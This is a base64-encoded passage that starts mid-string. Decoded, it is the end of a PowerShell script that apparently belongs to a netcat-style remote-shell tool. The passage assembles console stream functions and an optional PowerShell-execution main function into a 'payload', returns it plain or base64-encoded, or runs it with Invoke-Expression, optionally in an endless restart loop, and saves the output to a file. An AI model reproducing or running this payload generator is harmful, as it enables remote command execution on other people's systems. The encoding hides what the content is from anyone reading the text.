NldHVwX0NvbnNvbGV9ICsgImBufWBuYG4iKQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfQ29uc29sZX0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX0NvbnNvbGV9ICsgImBufWBuYG4iKQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfQ29uc29sZX0gKyAiYG59YG5gbiIpCiAgICAkSW52b2tlU3RyaW5nICs9ICgiQCgnIiArICRvICsgIicpIikKICB9CiAgCiAgaWYoJGVwKXskRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBNYWluYG57YG4iICsgJHtmdW5jdGlvbjpNYWluX1Bvd2Vyc2hlbGx9ICsgImBufWBuYG4iKX0KICBlbHNleyRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIE1haW5gbntgbiIgKyAke2Z1bmN0aW9uOk1haW59ICsgImBufWBuYG4iKX0KICAkSW52b2tlU3RyaW5nID0gKCRGdW5jdGlvblN0cmluZyArICRJbnZva2VTdHJpbmcpCiAgIyMjIyMjIyMjIyBHRU5FUkFURSBQQVlMT0FEICMjIyMjIyMjIyMKICAKICAjIyMjIyMjIyMjIFJFVFVSTiBHRU5FUkFURUQgUEFZTE9BRFMgIyMjIyMjIyMjIwogIGlmKCRnZSl7V3JpdGUtVmVyYm9zZSAiUmV0dXJuaW5nIEVuY29kZWQgUGF5bG9hZC4uLiIgOyByZXR1cm4gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCRJbnZva2VTdHJpbmcpKX0KICBlbHNlaWYoJGcpe1dyaXRlLVZlcmJvc2UgIlJldHVybmluZyBQYXlsb2FkLi4uIiA7IHJldHVybiAkSW52b2tlU3RyaW5nfQogICMjIyMjIyMjIyMgUkVUVVJOIEdFTkVSQVRFRCBQQVlMT0FEUyAjIyMjIyMjIyMjCiAgCiAgIyMjIyMjIyMjIyBFWEVDVVRJT04gIyMjIyMjIyMjIwogICRPdXRwdXQgPSAkbnVsbAogIHRyeQogIHsKICAgIGlmKCRyZXApCiAgICB7CiAgICAgIHdoaWxlKCRUcnVlKQogICAgICB7CiAgICAgICAgJE91dHB1dCArPSBJRVggJEludm9rZVN0cmluZwogICAgICAgIFN0YXJ0LVNsZWVwIC1zIDIKICAgICAgICBXcml0ZS1WZXJib3NlICJSZXBldGl0aW9uIEVuYWJsZWQ6IFJlc3RhcnRpbmcuLi4iCiAgICAgIH0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgJE91dHB1dCArPSBJRVggJEludm9rZVN0cmluZwogICAgfQogIH0KICBmaW5hbGx5CiAgewogICAgaWYoJE91dHB1dCAtbmUgJG51bGwpCiAgICB7CiAgICAgIGlmKCRvZiAtZXEgIiIpeyRPdXRwdXR9CiAgICAgIGVsc2V7W2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRvZiwkT3V0cHV0KX0KICAgIH0KICB9CiAgIyMjIyMjIyMjIyBFWEVDVVRJT04gIyMjIyMjIyMjIwp9Cg==
